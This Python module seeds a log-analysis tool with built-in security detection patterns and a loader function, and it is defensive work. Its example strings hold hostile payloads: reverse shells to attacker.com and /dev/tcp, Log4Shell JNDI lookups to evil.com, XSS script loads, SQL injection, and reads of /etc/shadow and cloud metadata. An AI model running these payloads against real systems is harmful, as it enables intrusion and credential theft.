"""Default built-in security patterns for application log analysis.

These patterns are loaded into the database on first startup if they don't exist.
Users can disable them but cannot delete them.
"""

from app.models.alert import AlertSeverity
from app.models.security_pattern import PatternCategory, PatternType

# Default security patterns organized by category
DEFAULT_SECURITY_PATTERNS: list[dict] = [
    # ============================================
    # SQL Injection Patterns
    # ============================================
    {
        "name": "SQL UNION Attack",
        "description": "Detects UNION-based SQL injection attempts that try to combine "
        "query results with attacker-controlled queries.",
        "category": PatternCategory.SQL_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)union\s+(all\s+)?select\s+",
        "severity": AlertSeverity.HIGH,
        "tags": ["owasp-top-10", "injection", "database"],
        "examples": ["' UNION SELECT * FROM users--", "1 UNION ALL SELECT password FROM admin"],
        "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
    },
    {
        "name": "SQL OR 1=1 Injection",
        "description": "Detects classic OR-based SQL injection attempts to bypass "
        "authentication or extract data.",
        "category": PatternCategory.SQL_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(or|and)\s+['\"]?[\d]+['\"]?\s*=\s*['\"]?[\d]+['\"]?",
        "severity": AlertSeverity.HIGH,
        "tags": ["owasp-top-10", "injection", "authentication-bypass"],
        "examples": ["' OR 1=1--", "' AND 1=1--", "admin' OR '1'='1"],
        "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
    },
    {
        "name": "SQL Comment Injection",
        "description": "Detects SQL comment sequences used to truncate queries in injection attacks.",
        "category": PatternCategory.SQL_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(--|#|/\*|\*/|;)\s*(drop|delete|truncate|update|insert|select)",
        "severity": AlertSeverity.CRITICAL,
        "tags": ["owasp-top-10", "injection", "database-manipulation"],
        "examples": ["'; DROP TABLE users--", "/**/SELECT/**/password/**/FROM/**/users"],
        "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
    },
    {
        "name": "SQL Time-based Blind Injection",
        "description": "Detects time-based blind SQL injection using SLEEP, WAITFOR, or BENCHMARK.",
        "category": PatternCategory.SQL_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(sleep|waitfor\s+delay|benchmark|pg_sleep)\s*\(",
        "severity": AlertSeverity.HIGH,
        "tags": ["owasp-top-10", "injection", "blind-sqli"],
        "examples": ["'; WAITFOR DELAY '0:0:10'--", "1' AND SLEEP(5)--"],
        "references": ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
    },
    {
        "name": "SQL Stacked Query Injection",
        "description": "Detects stacked query SQL injection attempts using semicolons.",
        "category": PatternCategory.SQL_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i);\s*(drop|delete|truncate|update|insert|create|alter)\s+",
        "severity": AlertSeverity.CRITICAL,
        "tags": ["owasp-top-10", "injection", "database-manipulation"],
        "examples": ["'; DELETE FROM users;--", "; INSERT INTO admin VALUES('hacker')"],
        "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
    },
    # ============================================
    # Command Injection Patterns
    # ============================================
    {
        "name": "Shell Command Injection",
        "description": "Detects shell metacharacters commonly used in command injection attacks.",
        "category": PatternCategory.COMMAND_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)[;&|`$]\s*(cat|ls|pwd|whoami|id|uname|wget|curl|nc|bash|sh|python|perl|ruby|php)\b",
        "severity": AlertSeverity.CRITICAL,
        "tags": ["owasp-top-10", "injection", "rce"],
        "examples": ["; cat /etc/passwd", "| whoami", "`id`"],
        "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
    },
    {
        "name": "Backtick Command Substitution",
        "description": "Detects backtick command substitution used for command injection.",
        "category": PatternCategory.COMMAND_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"`[^`]+`",
        "severity": AlertSeverity.HIGH,
        "tags": ["injection", "rce", "shell"],
        "examples": ["`whoami`", "`cat /etc/passwd`"],
        "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
    },
    {
        "name": "Dollar Command Substitution",
        "description": "Detects $() command substitution syntax used in command injection.",
        "category": PatternCategory.COMMAND_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"\$\([^)]+\)",
        "severity": AlertSeverity.HIGH,
        "tags": ["injection", "rce", "shell"],
        "examples": ["$(whoami)", "$(cat /etc/shadow)"],
        "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
    },
    {
        "name": "Reverse Shell Attempt",
        "description": "Detects common reverse shell patterns in logs.",
        "category": PatternCategory.COMMAND_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(bash\s+-i|nc\s+.+\s+-e|python.+socket|perl.+socket|/dev/tcp/)",
        "severity": AlertSeverity.CRITICAL,
        "tags": ["rce", "reverse-shell", "post-exploitation"],
        "examples": [
            "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
            "nc -e /bin/sh attacker.com 4444",
        ],
        "references": ["https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"],
    },
    # ============================================
    # Path Traversal Patterns
    # ============================================
    {
        "name": "Path Traversal - Basic",
        "description": "Detects basic directory traversal sequences.",
        "category": PatternCategory.PATH_TRAVERSAL,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(\.\.[\\/]){2,}",
        "severity": AlertSeverity.HIGH,
        "tags": ["owasp-top-10", "lfi", "file-disclosure"],
        "examples": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"],
        "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
    },
    {
        "name": "Path Traversal - URL Encoded",
        "description": "Detects URL-encoded directory traversal attempts.",
        "category": PatternCategory.PATH_TRAVERSAL,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(%2e%2e[\\/]|%2e%2e%2f|%2e%2e%5c){2,}",
        "severity": AlertSeverity.HIGH,
        "tags": ["owasp-top-10", "lfi", "encoding-bypass"],
        "examples": ["%2e%2e%2f%2e%2e%2fetc/passwd", "%2e%2e%5c%2e%2e%5cwindows"],
        "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
    },
    {
        "name": "Path Traversal - Double Encoded",
        "description": "Detects double URL-encoded directory traversal attempts.",
        "category": PatternCategory.PATH_TRAVERSAL,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(%252e%252e[\\/]|%252e%252e%252f|%252e%252e%255c)+",
        "severity": AlertSeverity.HIGH,
        "tags": ["owasp-top-10", "lfi", "double-encoding"],
        "examples": ["%252e%252e%252f%252e%252e%252fetc/passwd"],
        "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
    },
    {
        "name": "Sensitive File Access",
        "description": "Detects attempts to access sensitive system files.",
        "category": PatternCategory.PATH_TRAVERSAL,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(/etc/passwd|/etc/shadow|/etc/hosts|\.htpasswd|\.htaccess|web\.config|\.env|\.git/config)",
        "severity": AlertSeverity.CRITICAL,
        "tags": ["file-disclosure", "configuration-exposure"],
        "examples": ["/etc/passwd", "/.env", "/.git/config"],
        "references": ["https://owasp.org/www-project-web-security-testing-guide/"],
    },
    # ============================================
    # XSS Patterns
    # ============================================
    {
        "name": "XSS - Script Tag",
        "description": "Detects script tag injection attempts.",
        "category": PatternCategory.XSS,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)<\s*script[^>]*>",
        "severity": AlertSeverity.HIGH,
        "tags": ["owasp-top-10", "xss", "reflected-xss"],
        "examples": ["<script>alert('xss')</script>", "<SCRIPT SRC=http://evil.com/xss.js>"],
        "references": ["https://owasp.org/www-community/attacks/xss/"],
    },
    {
        "name": "XSS - Event Handler",
        "description": "Detects event handler-based XSS attempts.",
        "category": PatternCategory.XSS,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(on(load|click|error|mouseover|submit|focus|blur|change|keyup|keydown))\s*=",
        "severity": AlertSeverity.HIGH,
        "tags": ["owasp-top-10", "xss", "dom-xss"],
        "examples": ['<img src=x onerror=alert(1)>', '<body onload="malicious()">'],
        "references": ["https://owasp.org/www-community/attacks/xss/"],
    },
    {
        "name": "XSS - JavaScript URI",
        "description": "Detects javascript: URI scheme used in XSS attacks.",
        "category": PatternCategory.XSS,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)javascript\s*:",
        "severity": AlertSeverity.HIGH,
        "tags": ["owasp-top-10", "xss"],
        "examples": ['<a href="javascript:alert(1)">', "javascript:document.location='http://evil.com'"],
        "references": ["https://owasp.org/www-community/attacks/xss/"],
    },
    {
        "name": "XSS - Data URI",
        "description": "Detects data: URI scheme potentially used for XSS.",
        "category": PatternCategory.XSS,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)data\s*:\s*text/html",
        "severity": AlertSeverity.MEDIUM,
        "tags": ["xss", "encoding-bypass"],
        "examples": ["<a href='data:text/html,<script>alert(1)</script>'>"],
        "references": ["https://owasp.org/www-community/attacks/xss/"],
    },
    # ============================================
    # Deserialization Patterns
    # ============================================
    {
        "name": "Java Deserialization - ysoserial",
        "description": "Detects common Java deserialization gadget chains from ysoserial.",
        "category": PatternCategory.DESERIALIZATION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(org\.apache\.commons\.collections\.functors\.InvokerTransformer|"
        r"org\.apache\.commons\.collections4|"
        r"org\.springframework\.beans\.factory\.config\.PropertyPathFactoryBean|"
        r"com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl|"
        r"java\.lang\.Runtime\.getRuntime\(\)\.exec)",
        "severity": AlertSeverity.CRITICAL,
        "tags": ["deserialization", "rce", "java"],
        "examples": ["org.apache.commons.collections.functors.InvokerTransformer"],
        "references": ["https://github.com/frohoff/ysoserial"],
    },
    {
        "name": "Java ObjectInputStream",
        "description": "Detects ObjectInputStream usage which may indicate deserialization.",
        "category": PatternCategory.DESERIALIZATION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)java\.io\.ObjectInputStream|readObject\(\)",
        "severity": AlertSeverity.MEDIUM,
        "tags": ["deserialization", "java"],
        "examples": ["ObjectInputStream ois = new ObjectInputStream(data)"],
        "references": ["https://owasp.org/www-project-web-security-testing-guide/"],
    },
    {
        "name": "Python Pickle Deserialization",
        "description": "Detects Python pickle deserialization which can lead to RCE.",
        "category": PatternCategory.DESERIALIZATION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(pickle\.loads?\(|cPickle\.loads?\(|yaml\.load\(|yaml\.unsafe_load)",
        "severity": AlertSeverity.HIGH,
        "tags": ["deserialization", "rce", "python"],
        "examples": ["pickle.loads(user_input)", "yaml.load(data)"],
        "references": ["https://davidhamann.de/2020/04/05/exploiting-python-pickle/"],
    },
    # ============================================
    # SSRF Patterns
    # ============================================
    {
        "name": "SSRF - Internal IP Access",
        "description": "Detects attempts to access internal/private IP addresses.",
        "category": PatternCategory.SSRF,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(https?://)(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|169\.254\.|0\.0\.0\.0|localhost)",
        "severity": AlertSeverity.HIGH,
        "tags": ["ssrf", "internal-network"],
        "examples": ["http://127.0.0.1:8080/admin", "http://192.168.1.1/config"],
        "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
    },
    {
        "name": "SSRF - Cloud Metadata Access",
        "description": "Detects attempts to access cloud provider metadata endpoints.",
        "category": PatternCategory.SSRF,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)(169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200)",
        "severity": AlertSeverity.CRITICAL,
        "tags": ["ssrf", "cloud", "metadata"],
        "examples": [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ],
        "references": ["https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af"],
    },
    # ============================================
    # Authentication Bypass Patterns
    # ============================================
    {
        "name": "JWT None Algorithm",
        "description": "Detects JWT tokens with 'none' algorithm attempting to bypass signature verification.",
        "category": PatternCategory.AUTH_BYPASS,
        "pattern_type": PatternType.REGEX,
        "pattern": r'(?i)"alg"\s*:\s*"none"',
        "severity": AlertSeverity.CRITICAL,
        "tags": ["jwt", "authentication-bypass"],
        "examples": ['{"alg":"none","typ":"JWT"}'],
        "references": ["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"],
    },
    {
        "name": "Default Credentials",
        "description": "Detects common default username/password combinations.",
        "category": PatternCategory.AUTH_BYPASS,
        "pattern_type": PatternType.KEYWORD,
        "pattern": "admin:admin,root:root,admin:password,admin:123456,test:test,guest:guest",
        "severity": AlertSeverity.MEDIUM,
        "tags": ["default-credentials", "authentication"],
        "examples": ["admin:admin", "root:root"],
        "references": ["https://cwe.mitre.org/data/definitions/798.html"],
    },
    # ============================================
    # Log Injection Patterns
    # ============================================
    {
        "name": "Log Injection - Newline",
        "description": "Detects newline characters in log entries that could be used for log injection.",
        "category": PatternCategory.LOG_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(%0d|%0a|\\r|\\n|\r|\n).*(INFO|WARN|ERROR|DEBUG|FATAL)",
        "severity": AlertSeverity.MEDIUM,
        "tags": ["log-injection", "log-forging"],
        "examples": ["%0d%0aINFO: User logged in successfully"],
        "references": ["https://owasp.org/www-community/attacks/Log_Injection"],
    },
    {
        "name": "Log4Shell (CVE-2021-44228)",
        "description": "Detects Log4j JNDI lookup patterns used in Log4Shell attacks.",
        "category": PatternCategory.LOG_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)\$\{(jndi|lower|upper|env|sys|java|main):[^}]+\}",
        "severity": AlertSeverity.CRITICAL,
        "tags": ["log4shell", "cve-2021-44228", "rce", "java"],
        "examples": [
            "${jndi:ldap://evil.com/exploit}",
            "${${lower:j}${lower:n}di:ldap://attacker.com/a}",
        ],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
    },
    # ============================================
    # LDAP Injection Patterns
    # ============================================
    {
        "name": "LDAP Injection",
        "description": "Detects LDAP injection characters and patterns.",
        "category": PatternCategory.LDAP_INJECTION,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)([()\\|*]|%28|%29|%5c|%7c|%2a)",
        "severity": AlertSeverity.MEDIUM,
        "tags": ["ldap", "injection"],
        "examples": ["*)(uid=*))(|(uid=*", "admin)(&)"],
        "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
    },
    # ============================================
    # XXE Patterns
    # ============================================
    {
        "name": "XXE - DOCTYPE Declaration",
        "description": "Detects XML External Entity injection via DOCTYPE declarations.",
        "category": PatternCategory.XXE,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)<!DOCTYPE[^>]+\[",
        "severity": AlertSeverity.HIGH,
        "tags": ["xxe", "xml", "injection"],
        "examples": ['<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'],
        "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
    },
    {
        "name": "XXE - SYSTEM Entity",
        "description": "Detects SYSTEM entity declarations used in XXE attacks.",
        "category": PatternCategory.XXE,
        "pattern_type": PatternType.REGEX,
        "pattern": r"(?i)<!ENTITY[^>]+SYSTEM",
        "severity": AlertSeverity.HIGH,
        "tags": ["xxe", "xml", "injection"],
        "examples": ['<!ENTITY xxe SYSTEM "file:///etc/passwd">'],
        "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
    },
]


async def load_default_patterns(session: "AsyncSession") -> tuple[int, int]:
    """Load default security patterns into the database.

    This should be called during application startup. It will:
    - Create patterns that don't exist
    - Skip patterns that already exist (by name)

    Returns:
        Tuple of (created_count, skipped_count)
    """
    from sqlalchemy import select

    from app.models.security_pattern import PatternSource, SecurityPattern

    created = 0
    skipped = 0

    for pattern_data in DEFAULT_SECURITY_PATTERNS:
        # Check if pattern already exists by name
        result = await session.execute(
            select(SecurityPattern).where(SecurityPattern.name == pattern_data["name"])
        )
        existing = result.scalar_one_or_none()

        if existing:
            skipped += 1
            continue

        # Create new pattern
        pattern = SecurityPattern(
            name=pattern_data["name"],
            description=pattern_data["description"],
            category=pattern_data["category"],
            pattern_type=pattern_data["pattern_type"],
            pattern=pattern_data["pattern"],
            severity=pattern_data["severity"],
            enabled=True,
            tags=pattern_data.get("tags", []),
            extra_data={},
            source=PatternSource.BUILTIN,
            feed_id=None,
            examples=pattern_data.get("examples", []),
            references=pattern_data.get("references", []),
        )
        session.add(pattern)
        created += 1

    await session.commit()

    return created, skipped
